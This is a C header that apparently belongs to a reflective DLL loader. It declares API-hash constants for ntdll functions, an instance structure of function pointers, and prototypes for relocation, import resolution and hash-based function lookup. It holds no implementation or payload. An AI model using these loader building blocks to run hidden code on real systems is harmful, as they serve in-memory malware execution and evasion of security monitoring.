
#include <windows.h>
#include <Macro.h>

UINT_PTR GetRIP( VOID );
LPVOID   KaynCaller();

#define MemCopy                         __builtin_memcpy
#define NTDLL_HASH                      0x70e61753

#define SYS_LDRLOADDLL                  0x9e456a43
#define SYS_NTALLOCATEVIRTUALMEMORY     0xf783b8ec
#define SYS_NTPROTECTEDVIRTUALMEMORY    0x50e92888

typedef struct {
    WORD offset :12;
    WORD type   :4;
} *PIMAGE_RELOC;

typedef struct
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} U_STRING, *PU_STRING;

typedef struct
{
    struct
    {
        UINT_PTR Ntdll;
    } Modules;

    struct {
        NTSTATUS ( NTAPI *LdrLoadDll )(
                PWSTR           DllPath,
                PULONG          DllCharacteristics,
                PU_STRING       DllName,
                PVOID           *DllHandle
        );

        NTSTATUS ( NTAPI *NtAllocateVirtualMemory ) (
                HANDLE      ProcessHandle,
                PVOID       *BaseAddress,
                ULONG_PTR   ZeroBits,
                PSIZE_T     RegionSize,
                ULONG       AllocationType,
                ULONG       Protect
        );

        NTSTATUS ( NTAPI *NtProtectVirtualMemory ) (
                HANDLE  ProcessHandle,
                PVOID   *BaseAddress,
                PSIZE_T RegionSize,
                ULONG   NewProtect,
                PULONG  OldProtect
        );
    } Win32;

} INSTANCE, *PINSTANCE;

VOID     KResolveIAT( PINSTANCE Instance, PVOID KaynImage, PVOID IatDir );
VOID     KaynLdrReloc( PVOID KaynImage, PVOID ImageBase, PVOID Dir );

PVOID   KGetProcAddressByHash( PINSTANCE Instance, PVOID DllModuleBase, DWORD FunctionHash, DWORD Ordinal );
PVOID   KLoadLibrary( PINSTANCE Instance, LPSTR Module );

SIZE_T  KStringLengthA( LPCSTR String );
SIZE_T  KStringLengthW( LPCWSTR String );
SIZE_T  KCharStringToWCharString( PWCHAR Destination, PCHAR Source, SIZE_T MaximumAllowed );